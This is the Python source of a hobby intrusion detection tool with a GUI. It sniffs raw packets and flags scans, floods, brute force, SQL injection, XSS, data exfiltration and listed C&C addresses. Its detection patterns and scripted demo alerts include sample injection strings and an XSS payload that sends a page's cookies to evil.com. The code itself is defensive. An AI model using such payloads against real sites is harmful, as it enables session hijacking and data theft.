"""
╔══════════════════════════════════════════════════════════╗
║         SecureWatch v1.0                                 ║
║         Intrusion Detection System                       ║
║         Author: Abdulelah Mutlaq Alotaibe                ║
╚══════════════════════════════════════════════════════════╝
Requirements: pip install customtkinter
"""

import customtkinter as ctk
import socket
import struct
import time
import os
import re
import json
import threading
import queue
from datetime import datetime
from collections import defaultdict

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

CLR_BG      = "#0d0f14"
CLR_PANEL   = "#13161e"
CLR_CARD    = "#1a1d27"
CLR_BORDER  = "#2a2d3a"
CLR_RED     = "#ff4757"
CLR_YELLOW  = "#ffa502"
CLR_GREEN   = "#2ed573"
CLR_CYAN    = "#1e90ff"
CLR_MAGENTA = "#a55eea"
CLR_TEXT    = "#e8eaf0"
CLR_MUTED   = "#6b7280"

SETTINGS = {
    "port_scan_threshold": 15, "port_scan_window": 5,
    "brute_force_threshold": 5, "brute_force_window": 10,
    "ddos_threshold": 100, "ddos_window": 5,
    "icmp_flood_threshold": 30, "icmp_flood_window": 3,
    "exfil_bytes_threshold": 5_000_000, "exfil_window": 60,
    "log_file": "securewatch_log.json",
}

DANGEROUS_PORTS = {
    21:"FTP", 22:"SSH", 23:"Telnet", 25:"SMTP", 53:"DNS",
    110:"POP3", 135:"RPC", 139:"NetBIOS", 143:"IMAP",
    445:"SMB", 1433:"MSSQL", 3306:"MySQL", 3389:"RDP",
    4444:"Metasploit", 5900:"VNC", 6666:"IRC", 8080:"HTTP-Alt", 9001:"Tor",
}
SUSPICIOUS_PORTS  = {1234,4444,5555,6666,7777,8888,9999,31337,12345,54321,1337,2222}
MALWARE_CC_IPS    = {"185.220.101.0","185.220.101.1","198.96.155.3","62.210.105.116"}
SQL_PATTERNS  = [rb"(?i)(union\s+select)",rb"(?i)(drop\s+table)",rb"(?i)(exec\s*\()",rb"1=1"]
XSS_PATTERNS  = [rb"(?i)(<script[\s\S]*?>)",rb"(?i)(javascript\s*:)",rb"(?i)(document\.cookie)"]
EXFIL_PATTERNS= [rb"(?i)(password\s*[:=]\s*\S+)",rb"\b\d{16}\b",rb"(?i)(api.?key\s*[:=]\s*\S+)"]

DEMO_ATTACKS = {
    "Port Scan": {
        "desc": "Attacker rapidly scans your network ports",
        "color": CLR_YELLOW,
        "steps": [
            ("INFO",    "Normal Traffic",         "192.168.1.55", "HTTP GET /index.html — safe"),
            ("WARNING", "Sensitive Port — SSH",   "203.0.113.42", "Connection attempt on port 22 (SSH)"),
            ("WARNING", "Sensitive Port — FTP",   "203.0.113.42", "Connection attempt on port 21 (FTP)"),
            ("WARNING", "Sensitive Port — RDP",   "203.0.113.42", "Connection attempt on port 3389 (RDP)"),
            ("CRITICAL","Port Scan Detected",     "203.0.113.42", "Scanned 18 ports in 5s — attacker mapping your network!"),
        ]
    },
    "Brute Force": {
        "desc": "Attacker tries thousands of passwords on SSH",
        "color": CLR_RED,
        "steps": [
            ("INFO",    "Normal Traffic",          "10.0.0.99", "Regular HTTPS connection — safe"),
            ("WARNING", "Repeated Login Attempts", "10.0.0.99", "2 failed attempts on port 22"),
            ("WARNING", "Repeated Login Attempts", "10.0.0.99", "3 failed attempts on port 22"),
            ("CRITICAL","Brute Force — SSH",       "10.0.0.99", "5 attempts in 10s — password cracking detected!"),
        ]
    },
    "DDoS Attack": {
        "desc": "Flood of packets overwhelming your server",
        "color": CLR_RED,
        "steps": [
            ("INFO",    "Normal Traffic",       "172.16.0.5", "Regular traffic — 12 packets/s"),
            ("WARNING", "High Traffic Volume",  "172.16.0.5", "Traffic spike — 60 packets/s"),
            ("CRITICAL","DDoS Detected",        "172.16.0.5", "105 packets in 5s — server under attack!"),
        ]
    },
    "SQL Injection": {
        "desc": "Attacker injects malicious SQL into web forms",
        "color": CLR_MAGENTA,
        "steps": [
            ("INFO",    "Normal Web Request",   "198.51.100.7", "GET /login.php — normal"),
            ("CRITICAL","SQL Injection",        "198.51.100.7", "Pattern: \"' OR 1=1 --\" found in POST data!"),
            ("CRITICAL","SQL Injection",        "198.51.100.7", "Pattern: \"UNION SELECT username,password FROM users\" — DB dump!"),
        ]
    },
    "XSS Attack": {
        "desc": "Attacker injects JavaScript into web pages",
        "color": CLR_MAGENTA,
        "steps": [
            ("INFO",    "Normal Web Request",  "45.33.32.156", "GET /index.html — normal"),
            ("CRITICAL","XSS Attack",          "45.33.32.156", "<script>document.location='http://evil.com/?c='+document.cookie</script>"),
        ]
    },
    "ARP Spoofing": {
        "desc": "Attacker intercepts local network traffic (MITM)",
        "color": CLR_CYAN,
        "steps": [
            ("INFO",    "ARP Table Normal",    "192.168.1.1", "Gateway MAC: aa:bb:cc:dd:ee:ff — verified"),
            ("CRITICAL","ARP Spoofing",        "192.168.1.1", "MAC changed: aa:bb:cc:dd:ee:ff → 11:22:33:44:55:66 — MITM attack!"),
        ]
    },
    "Malware C&C": {
        "desc": "Infected device calling home to malware server",
        "color": CLR_RED,
        "steps": [
            ("INFO",    "Normal Outbound",      "192.168.1.20", "HTTPS to google.com — safe"),
            ("INFO",    "Normal Outbound",      "192.168.1.20", "DNS lookup github.com — safe"),
            ("CRITICAL","Malware C&C",          "192.168.1.20", "Connection to C&C server: 185.220.101.1 — device may be infected!"),
        ]
    },
    "Data Exfiltration": {
        "desc": "Sensitive data being stolen from your system",
        "color": CLR_YELLOW,
        "steps": [
            ("INFO",    "Normal Outbound",      "192.168.1.30", "Regular HTTPS — 2KB sent"),
            ("CRITICAL","Data Exfiltration",    "192.168.1.30", "Pattern: \"password=Admin@1234\" in outbound packet!"),
            ("CRITICAL","Data Exfiltration",    "192.168.1.30", "Pattern: \"api_key=sk-9f2a8b3c...\" — API key leaked!"),
        ]
    },
    "Full Scenario": {
        "desc": "Complete multi-stage attack: Recon → Exploit → Exfil",
        "color": CLR_RED,
        "steps": [
            ("INFO",    "Monitoring...",         "203.0.113.99", "Network traffic appears normal..."),
            ("WARNING", "Sensitive Port — SSH",  "203.0.113.99", "Connection attempt on port 22"),
            ("WARNING", "Sensitive Port — RDP",  "203.0.113.99", "Connection attempt on port 3389"),
            ("CRITICAL","Port Scan Detected",    "203.0.113.99", "Stage 1: Reconnaissance — 20 ports scanned!"),
            ("CRITICAL","Brute Force — SSH",     "203.0.113.99", "Stage 2: Gaining Access — 8 attempts in 10s!"),
            ("CRITICAL","SQL Injection",         "203.0.113.99", "Stage 3: Database Exploit — UNION SELECT * FROM users!"),
            ("CRITICAL","Data Exfiltration",     "203.0.113.99", "Stage 4: Stealing Data — password=root123 detected!"),
            ("CRITICAL","Malware C&C",           "203.0.113.99", "Stage 5: Backdoor — connecting to C&C 185.220.101.1!"),
        ]
    },
}

port_tracker   = defaultdict(list)
login_tracker  = defaultdict(list)
packet_tracker = defaultdict(list)
icmp_tracker   = defaultdict(list)
blocked_ips    = set()
logs           = []

# Queue for safe communication between network thread and UI
event_queue = queue.Queue(maxsize=500)

stats = {
    "total":0,"threats":0,"warnings":0,
    "sql":0,"xss":0,"cc":0,"exfil":0,"zeroday":0,"icmp":0,
    "start_time": datetime.now()
}

def clear_old(lst, window):
    now = time.time()
    return [t for t in lst if now - t < window]

def save_log(entry):
    logs.append(entry)
    try:
        with open(SETTINGS["log_file"], "w", encoding="utf-8") as f:
            json.dump(logs, f, ensure_ascii=False, indent=2)
    except:
        pass

def parse_ip_header(raw):
    try:
        iph = struct.unpack('!BBHHHBBH4s4s', raw[:20])
        ihl = (iph[0] & 0xF) * 4
        return ihl, iph[6], socket.inet_ntoa(iph[8]), socket.inet_ntoa(iph[9])
    except:
        return None, None, None, None


# ═══════════════════════════════════════════
#  Demo Window — Separate Window
# ═══════════════════════════════════════════
class DemoWindow(ctk.CTkToplevel):
    def __init__(self, parent):
        super().__init__(parent)
        self.title("SecureWatch — Demo Mode")
        self.geometry("820x640")
        self.minsize(700, 500)
        self.configure(fg_color=CLR_BG)
        self.resizable(True, True)
        self._build()

    def _build(self):
        # Header
        hdr = ctk.CTkFrame(self, fg_color=CLR_PANEL, height=55, corner_radius=0)
        hdr.pack(fill="x")
        hdr.pack_propagate(False)
        ctk.CTkLabel(hdr, text="🎮  Demo Mode — Simulate Attacks",
                     font=ctk.CTkFont(size=14, weight="bold"),
                     text_color=CLR_CYAN).pack(side="left", padx=20, pady=15)
        ctk.CTkButton(hdr, text="✕ Close",
                      fg_color="transparent", hover_color=CLR_CARD,
                      text_color=CLR_MUTED, font=ctk.CTkFont(size=12),
                      width=80, height=32,
                      command=self.destroy).pack(side="right", padx=12)

        body = ctk.CTkFrame(self, fg_color=CLR_BG)
        body.pack(fill="both", expand=True, padx=12, pady=12)

        # Left sidebar — attack list
        left = ctk.CTkFrame(body, fg_color=CLR_PANEL, width=240, corner_radius=12)
        left.pack(fill="y", side="left", padx=(0,10))
        left.pack_propagate(False)

        ctk.CTkLabel(left, text="SELECT ATTACK",
                     font=ctk.CTkFont(size=11, weight="bold"),
                     text_color=CLR_MUTED).pack(pady=(16,8), padx=14, anchor="w")

        self._selected = ctk.StringVar(value="")

        for name, data in DEMO_ATTACKS.items():
            ctk.CTkButton(
                left, text=f"  {name}",
                fg_color=CLR_CARD, hover_color=CLR_BORDER,
                text_color=data["color"],
                font=ctk.CTkFont(size=12),
                height=38, corner_radius=8, anchor="w",
                command=lambda n=name: self._select(n)
            ).pack(fill="x", padx=10, pady=2)

        # Right — output
        right = ctk.CTkFrame(body, fg_color=CLR_BG)
        right.pack(fill="both", expand=True, side="left")

        # Info + run button
        info = ctk.CTkFrame(right, fg_color=CLR_CARD, corner_radius=12, height=64)
        info.pack(fill="x", pady=(0,8))
        info.pack_propagate(False)

        self._name_lbl = ctk.CTkLabel(
            info, text="← Choose an attack from the list",
            font=ctk.CTkFont(size=13, weight="bold"),
            text_color=CLR_MUTED)
        self._name_lbl.pack(side="left", padx=16)

        self._run_btn = ctk.CTkButton(
            info, text="▶  Run Demo",
            fg_color=CLR_GREEN, hover_color="#1db954",
            text_color="#000000",
            font=ctk.CTkFont(size=13, weight="bold"),
            width=130, height=38, corner_radius=8,
            state="disabled",
            command=self._run)
        self._run_btn.pack(side="right", padx=14)

        # Log
        log_panel = ctk.CTkFrame(right, fg_color=CLR_CARD, corner_radius=12)
        log_panel.pack(fill="both", expand=True)

        lhdr = ctk.CTkFrame(log_panel, fg_color="transparent")
        lhdr.pack(fill="x", padx=14, pady=(10,4))
        ctk.CTkLabel(lhdr, text="📋  Simulation Output",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color=CLR_TEXT).pack(side="left")
        ctk.CTkButton(lhdr, text="Clear",
                      fg_color="transparent", hover_color=CLR_BORDER,
                      text_color=CLR_MUTED, font=ctk.CTkFont(size=11),
                      width=50, height=26,
                      command=self._clear).pack(side="right")

        self._log = ctk.CTkTextbox(
            log_panel, fg_color=CLR_PANEL, text_color=CLR_TEXT,
            font=ctk.CTkFont(family="Courier New", size=11),
            corner_radius=8, wrap="word", state="disabled")
        self._log.pack(fill="both", expand=True, padx=10, pady=(0,10))
        self._log.tag_config("CRITICAL", foreground=CLR_RED)
        self._log.tag_config("WARNING",  foreground=CLR_YELLOW)
        self._log.tag_config("INFO",     foreground=CLR_GREEN)
        self._log.tag_config("MUTED",    foreground=CLR_MUTED)

        self._write("INFO","Ready","demo","Select an attack and press Run Demo")

    def _select(self, name):
        self._selected.set(name)
        data = DEMO_ATTACKS[name]
        self._name_lbl.configure(text=f"{name}  —  {data['desc']}",
                                  text_color=data["color"])
        self._run_btn.configure(state="normal")

    def _write(self, level, atype, ip, detail):
        ts   = datetime.now().strftime("%H:%M:%S")
        icon = {"CRITICAL":"🚨","WARNING":"⚠️ ","INFO":"✅"}.get(level,"•")
        self._log.configure(state="normal")
        self._log.insert("end", f"\n{icon} [{ts}] ", "MUTED")
        self._log.insert("end", f"[{level}] {atype}\n", level)
        self._log.insert("end", f"   Source  : {ip}\n", "MUTED")
        self._log.insert("end", f"   Details : {detail}\n", "MUTED")
        self._log.insert("end", f"   {'─'*42}\n", "MUTED")
        self._log.configure(state="disabled")
        self._log.see("end")

    def _clear(self):
        self._log.configure(state="normal")
        self._log.delete("1.0","end")
        self._log.configure(state="disabled")

    def _run(self):
        name = self._selected.get()
        if not name: return
        self._run_btn.configure(state="disabled", text="⏳ Running...")
        steps = DEMO_ATTACKS[name]["steps"]
        self._write("INFO", f"Demo: {name}", "demo-mode", f"Simulating {name}...")

        def play(i):
            if i >= len(steps):
                self.after(0, lambda: self._write("INFO","Demo Complete","demo-mode",
                                                   f"'{name}' simulation finished."))
                self.after(0, lambda: self._run_btn.configure(state="normal", text="▶  Run Demo"))
                return
            lv, at, ip, dt = steps[i]
            self.after(0, lambda l=lv,a=at,x=ip,d=dt: self._write(l,a,x,d))
            self.after(900, lambda: play(i+1))

        self.after(300, lambda: play(0))


# ═══════════════════════════════════════════
#  Main App
# ═══════════════════════════════════════════
class SecureWatch(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("SecureWatch v1.0 — Abdulelah Mutlaq Alotaibe")
        self.geometry("1200x750")
        self.minsize(1000,650)
        self.configure(fg_color=CLR_BG)
        self.monitoring = False
        self._conn = None
        self._demo_win = None
        self._build()
        self._stats_loop()

    def _build(self):
        # Top bar
        top = ctk.CTkFrame(self, fg_color=CLR_PANEL, height=60, corner_radius=0)
        top.pack(fill="x")
        top.pack_propagate(False)
        ctk.CTkLabel(top, text="🛡  SecureWatch",
                     font=ctk.CTkFont(size=22, weight="bold"),
                     text_color=CLR_CYAN).pack(side="left", padx=20, pady=15)
        ctk.CTkLabel(top, text="v1.0  |  Abdulelah Mutlaq Alotaibe",
                     font=ctk.CTkFont(size=11),
                     text_color=CLR_MUTED).pack(side="left", padx=4)
        self._status = ctk.CTkLabel(top, text="● IDLE",
                                    font=ctk.CTkFont(size=13, weight="bold"),
                                    text_color=CLR_MUTED)
        self._status.pack(side="right", padx=20)

        body = ctk.CTkFrame(self, fg_color=CLR_BG)
        body.pack(fill="both", expand=True, padx=12, pady=12)

        # Sidebar
        sb = ctk.CTkFrame(body, fg_color=CLR_PANEL, width=210, corner_radius=12)
        sb.pack(fill="y", side="left", padx=(0,10))
        sb.pack_propagate(False)
        self._sidebar(sb)

        # Right
        right = ctk.CTkFrame(body, fg_color=CLR_BG)
        right.pack(fill="both", expand=True, side="left")
        self._stats_row(right)
        self._log_panel(right)

    def _sidebar(self, p):
        ctk.CTkLabel(p, text="CONTROLS",
                     font=ctk.CTkFont(size=11, weight="bold"),
                     text_color=CLR_MUTED).pack(pady=(20,8), padx=14, anchor="w")

        self._mon_btn = ctk.CTkButton(
            p, text="▶  Start Monitoring",
            fg_color=CLR_GREEN, hover_color="#1db954",
            text_color="#000000",
            font=ctk.CTkFont(size=13, weight="bold"),
            height=44, corner_radius=10,
            command=self._toggle)
        self._mon_btn.pack(fill="x", padx=12, pady=4)

        ctk.CTkButton(
            p, text="🎮  Demo Mode",
            fg_color=CLR_CYAN, hover_color="#1565c0",
            text_color="#000000",
            font=ctk.CTkFont(size=13, weight="bold"),
            height=44, corner_radius=10,
            command=self._open_demo).pack(fill="x", padx=12, pady=4)

        ctk.CTkFrame(p, fg_color=CLR_BORDER, height=1).pack(fill="x", padx=12, pady=12)

        ctk.CTkButton(
            p, text="🗑  Clear Logs",
            fg_color=CLR_CARD, hover_color=CLR_BORDER,
            text_color=CLR_TEXT, font=ctk.CTkFont(size=12),
            height=36, corner_radius=8,
            command=self._clear).pack(fill="x", padx=12, pady=2)

        ctk.CTkFrame(p, fg_color=CLR_BORDER, height=1).pack(fill="x", padx=12, pady=12)
        ctk.CTkLabel(p, text="DETECTS",
                     font=ctk.CTkFont(size=11, weight="bold"),
                     text_color=CLR_MUTED).pack(padx=14, anchor="w", pady=(0,6))

        for name, clr in [
            ("Port Scan",     CLR_YELLOW), ("Brute Force",  CLR_RED),
            ("DDoS / ICMP",   CLR_RED),    ("SQL Injection",CLR_MAGENTA),
            ("XSS Attack",    CLR_MAGENTA),("Malware C&C",  CLR_RED),
            ("Data Exfil",    CLR_YELLOW), ("Zero-Day Ports",CLR_CYAN),
        ]:
            row = ctk.CTkFrame(p, fg_color="transparent")
            row.pack(fill="x", padx=14, pady=1)
            ctk.CTkLabel(row, text="●", text_color=clr,
                         font=ctk.CTkFont(size=10)).pack(side="left", padx=(0,6))
            ctk.CTkLabel(row, text=name, text_color=CLR_MUTED,
                         font=ctk.CTkFont(size=11)).pack(side="left")

        ctk.CTkFrame(p, fg_color=CLR_BORDER, height=1).pack(fill="x", padx=12, pady=8, side="bottom")
        ctk.CTkLabel(p, text="SecureWatch v1.0\nAbdulelah Mutlaq Alotaibe",
                     font=ctk.CTkFont(size=10), text_color=CLR_MUTED,
                     justify="center").pack(side="bottom", pady=8)

    def _stats_row(self, p):
        row = ctk.CTkFrame(p, fg_color=CLR_BG)
        row.pack(fill="x", pady=(0,8))
        self._sl = {}
        for label, key, clr, icon in [
            ("Total Packets","total",  CLR_CYAN,   "📦"),
            ("Threats",      "threats",CLR_RED,    "🚨"),
            ("Warnings",     "warnings",CLR_YELLOW,"⚠️"),
            ("Blocked IPs",  "blocked",CLR_MAGENTA,"🔒"),
        ]:
            c = ctk.CTkFrame(row, fg_color=CLR_CARD, corner_radius=12)
            c.pack(fill="both", expand=True, side="left", padx=4)
            ctk.CTkLabel(c, text=f"{icon}  {label}",
                         font=ctk.CTkFont(size=11), text_color=CLR_MUTED
                         ).pack(pady=(12,2), padx=14, anchor="w")
            lbl = ctk.CTkLabel(c, text="0",
                               font=ctk.CTkFont(size=28, weight="bold"), text_color=clr)
            lbl.pack(pady=(0,12), padx=14, anchor="w")
            self._sl[key] = lbl

        mini = ctk.CTkFrame(p, fg_color=CLR_CARD, corner_radius=12)
        mini.pack(fill="x", pady=(0,8))
        for label, key, clr in [
            ("SQL Inject","sql",CLR_MAGENTA),("XSS","xss",CLR_MAGENTA),
            ("Malware C&C","cc",CLR_RED),    ("Exfiltration","exfil",CLR_YELLOW),
            ("Zero-Day","zeroday",CLR_CYAN), ("ICMP Flood","icmp",CLR_CYAN),
        ]:
            col = ctk.CTkFrame(mini, fg_color="transparent")
            col.pack(side="left", expand=True, padx=8, pady=10)
            ctk.CTkLabel(col, text=label, font=ctk.CTkFont(size=10),
                         text_color=CLR_MUTED).pack()
            lbl = ctk.CTkLabel(col, text="0",
                               font=ctk.CTkFont(size=16, weight="bold"), text_color=clr)
            lbl.pack()
            self._sl[key] = lbl

    def _log_panel(self, p):
        panel = ctk.CTkFrame(p, fg_color=CLR_CARD, corner_radius=12)
        panel.pack(fill="both", expand=True)
        hdr = ctk.CTkFrame(panel, fg_color="transparent")
        hdr.pack(fill="x", padx=14, pady=(12,4))
        ctk.CTkLabel(hdr, text="📋  Live Event Log",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color=CLR_TEXT).pack(side="left")
        self._log_count = ctk.CTkLabel(hdr, text="0 events",
                                       font=ctk.CTkFont(size=11), text_color=CLR_MUTED)
        self._log_count.pack(side="right")

        self._log = ctk.CTkTextbox(
            panel, fg_color=CLR_PANEL, text_color=CLR_TEXT,
            font=ctk.CTkFont(family="Courier New", size=11),
            corner_radius=8, wrap="word", state="disabled")
        self._log.pack(fill="both", expand=True, padx=10, pady=(0,10))
        self._log.tag_config("CRITICAL", foreground=CLR_RED)
        self._log.tag_config("WARNING",  foreground=CLR_YELLOW)
        self._log.tag_config("INFO",     foreground=CLR_GREEN)
        self._log.tag_config("MUTED",    foreground=CLR_MUTED)

    def _write(self, level, atype, ip, detail):
        ts   = datetime.now().strftime("%H:%M:%S")
        icon = {"CRITICAL":"🚨","WARNING":"⚠️ ","INFO":"✅"}.get(level,"•")
        self._log.configure(state="normal")
        self._log.insert("end", f"\n{icon} [{ts}] ", "MUTED")
        self._log.insert("end", f"[{level}] {atype}\n", level)
        self._log.insert("end", f"   Source  : {ip}\n", "MUTED")
        self._log.insert("end", f"   Details : {detail}\n", "MUTED")
        self._log.insert("end", f"   {'─'*45}\n", "MUTED")
        self._log.configure(state="disabled")
        self._log.see("end")
        if level == "CRITICAL": stats["threats"] += 1
        elif level == "WARNING": stats["warnings"] += 1
        stats["total"] += 1
        n = int(self._log_count.cget("text").split()[0]) + 1
        self._log_count.configure(text=f"{n} events")
        save_log({"timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                  "level":level,"type":atype,"src_ip":ip,"details":detail})

    def _block(self, ip):
        if ip not in blocked_ips:
            blocked_ips.add(ip)

    def _stats_loop(self):
        for k in ["total","threats","warnings","sql","xss","cc","exfil","zeroday","icmp"]:
            if k in self._sl:
                v = stats.get(k,0)
                self._sl[k].configure(text=f"{v:,}" if k=="total" else str(v))
        self._sl["blocked"].configure(text=str(len(blocked_ips)))
        self.after(1000, self._stats_loop)

    def _toggle(self):
        if not self.monitoring: self._start()
        else: self._stop()

    def _start(self):
        self.monitoring = True
        while not event_queue.empty():
            try: event_queue.get_nowait()
            except: break
        self._mon_btn.configure(text="⏹  Stop Monitoring",
                                fg_color=CLR_RED, hover_color="#c0392b",
                                text_color=CLR_TEXT)
        self._status.configure(text="● MONITORING", text_color=CLR_GREEN)
        self._write("INFO","SecureWatch Started","localhost","Monitoring your network...")
        threading.Thread(target=self._loop, daemon=True).start()
        self._process_queue()

    def _stop(self):
        self.monitoring = False
        if self._conn:
            try: self._conn.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
            except: pass
            self._conn = None
        self._mon_btn.configure(text="▶  Start Monitoring",
                                fg_color=CLR_GREEN, hover_color="#1db954",
                                text_color="#000000")
        self._status.configure(text="● IDLE", text_color=CLR_MUTED)
        self._write("INFO","SecureWatch Stopped","localhost","Monitoring stopped.")

    def _push(self, level, atype, ip, detail, block=False):
        """Push event to queue safely from network thread"""
        try:
            event_queue.put_nowait((level, atype, ip, detail, block))
        except queue.Full:
            pass

    def _process_queue(self):
        """Process queued events in UI thread - called every 100ms"""
        try:
            processed = 0
            while not event_queue.empty() and processed < 10:
                level, atype, ip, detail, block = event_queue.get_nowait()
                self._write(level, atype, ip, detail)
                if block:
                    self._block(ip)
                processed += 1
        except:
            pass
        if self.monitoring:
            self.after(100, self._process_queue)

    def _loop(self):
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
            conn.bind((socket.gethostbyname(socket.gethostname()), 0))
            conn.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            conn.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
            self._conn = conn
            self._push("INFO", "Connected", "localhost", "Listening on network...")
            while self.monitoring:
                try:
                    conn.settimeout(1.0)
                    raw, _ = conn.recvfrom(65535)
                    self._process(raw)
                except socket.timeout:
                    continue
                except:
                    break
        except PermissionError:
            self._push("WARNING", "Permission Denied", "localhost",
                       "Run as Administrator! Right-click PyCharm → Run as Administrator")
            self.after(0, self._stop)
        except Exception as e:
            self._push("WARNING", "Error", "localhost", str(e))
            self.after(0, self._stop)

    def _process(self, raw):
        ihl, proto, src, dst = parse_ip_header(raw)
        if not src or src in blocked_ips: return
        if src.startswith("127.") or src == "0.0.0.0": return

        if proto == 1:
            icmp_tracker[src] = clear_old(icmp_tracker[src], SETTINGS["icmp_flood_window"])
            icmp_tracker[src].append(time.time())
            if len(icmp_tracker[src]) >= SETTINGS["icmp_flood_threshold"]:
                c = len(icmp_tracker[src])
                self._push("CRITICAL","ICMP Flood",src,
                           f"{c} ICMP packets in {SETTINGS['icmp_flood_window']}s", block=True)
                icmp_tracker[src].clear()
            return

        if proto == 6 and len(raw) > ihl+20:
            try: tcph = struct.unpack('!HHLLBBHHH', raw[ihl:ihl+20])
            except: return
            dport = tcph[1]; flags = tcph[5]
            payload = raw[ihl+((tcph[4]>>4)*4):]

            packet_tracker[src] = clear_old(packet_tracker[src], SETTINGS["ddos_window"])
            packet_tracker[src].append(time.time())
            if len(packet_tracker[src]) >= SETTINGS["ddos_threshold"]:
                c = len(packet_tracker[src])
                self._push("CRITICAL","DDoS",src,
                           f"{c} packets in {SETTINGS['ddos_window']}s", block=True)
                packet_tracker[src].clear()

            if flags & 0x02 and not (flags & 0x10):
                port_tracker[src] = clear_old(port_tracker[src], SETTINGS["port_scan_window"])
                if dport not in [p for _,p in port_tracker[src]]:
                    port_tracker[src].append((time.time(), dport))
                u = len(set(p for _,p in port_tracker[src]))
                if u >= SETTINGS["port_scan_threshold"]:
                    self._push("CRITICAL","Port Scan",src,
                               f"Scanned {u} ports in {SETTINGS['port_scan_window']}s", block=True)
                    port_tracker[src].clear()

                if dport in [22,21,23,3389,5900,1433,3306]:
                    login_tracker[src] = clear_old(login_tracker[src], SETTINGS["brute_force_window"])
                    login_tracker[src].append(time.time())
                    cnt = len(login_tracker[src])
                    svc = DANGEROUS_PORTS.get(dport, str(dport))
                    if cnt >= SETTINGS["brute_force_threshold"]:
                        self._push("CRITICAL",f"Brute Force — {svc}",src,
                                   f"{cnt} attempts in {SETTINGS['brute_force_window']}s on port {dport}",
                                   block=True)
                        login_tracker[src].clear()

                if dport in SUSPICIOUS_PORTS:
                    stats["zeroday"] += 1
                    self._push("WARNING","Suspicious Port",src,
                               f"Port {dport} — possible RAT/Backdoor")

            if payload:
                for pat in SQL_PATTERNS:
                    if re.search(pat, payload):
                        m = re.search(pat, payload).group(0)[:50].decode(errors="ignore")
                        stats["sql"] += 1
                        self._push("CRITICAL","SQL Injection",src,f'Pattern: "{m}"', block=True)
                        break
                for pat in XSS_PATTERNS:
                    if re.search(pat, payload):
                        m = re.search(pat, payload).group(0)[:50].decode(errors="ignore")
                        stats["xss"] += 1
                        self._push("CRITICAL","XSS Attack",src,f'Pattern: "{m}"', block=True)
                        break
                for pat in EXFIL_PATTERNS:
                    if re.search(pat, payload):
                        m = re.search(pat, payload).group(0)[:50].decode(errors="ignore")
                        stats["exfil"] += 1
                        self._push("CRITICAL","Data Exfiltration",src,f'Sensitive: "{m}"')
                        break
                if dst in MALWARE_CC_IPS:
                    stats["cc"] += 1
                    self._push("CRITICAL","Malware C&C",src,
                               f"Connection to C&C: {dst}", block=True)

    def _open_demo(self):
        if self._demo_win is None or not self._demo_win.winfo_exists():
            self._demo_win = DemoWindow(self)
            self._demo_win.focus()
        else:
            self._demo_win.focus()

    def _clear(self):
        self._log.configure(state="normal")
        self._log.delete("1.0","end")
        self._log.configure(state="disabled")
        self._log_count.configure(text="0 events")
        for k in stats:
            if k != "start_time": stats[k] = 0
        blocked_ips.clear()
        logs.clear()


# ═══════════════════════════════════════════
#  Entry Point
# ═══════════════════════════════════════════
if __name__ == "__main__":
    app = SecureWatch()
    app.mainloop()
